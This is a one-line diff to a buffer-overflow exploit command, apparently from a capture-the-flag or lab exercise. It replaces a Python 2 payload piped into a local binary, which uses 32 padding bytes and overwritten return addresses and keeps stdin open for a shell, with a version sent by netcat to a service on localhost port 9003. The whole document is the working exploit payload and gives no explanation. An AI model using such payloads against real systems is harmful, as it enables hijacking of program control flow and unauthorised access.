@@ -1,1 +1,1 @@
-(python2 -c "print('A'*32 +'\xc6\x91\x04\x08' + '\xfa\x91\x04\x08')" ; cat) | ./x
+python2 -c "print('A'*32 +'\x65\x99\x04\x08' + '\x99\x99\x04\x08')" | nc 127.0.0.1 9003
